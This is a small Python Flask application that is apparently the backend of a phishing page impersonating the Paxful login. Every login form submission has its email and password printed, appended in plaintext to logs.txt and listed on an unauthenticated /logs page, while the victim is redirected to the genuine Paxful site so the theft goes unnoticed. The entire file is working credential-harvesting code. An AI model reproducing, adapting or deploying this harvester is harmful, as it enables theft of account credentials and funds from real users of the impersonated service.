from flask import Flask,render_template,request,redirect
app = Flask(__name__, static_url_path='/static')


@app.route('/',methods=['GET','POST'])
def hello():
    if request.method=='GET':
        return render_template('index.html')
    if request.method=='POST':
        print(request.form.get('login_email'))
        print(request.form.get('login_password'))
        f=open("logs.txt","a+")
        f.write("Email: "+request.form.get('login_email')+"  Pass:"+request.form.get('login_password')+"\n")
        f.close()
        return redirect("https://paxful.com/login")

@app.route('/logs',methods=['GET'])
def logs():
    f=open("logs.txt","r")
    # f=f.split("||")
    output=""
    dict=[]
    for i in f:
        print(i)
        dict.append(i)
    return render_template('logs.html',dict=dict)

if __name__ == '__main__':
    app.run(debug=True)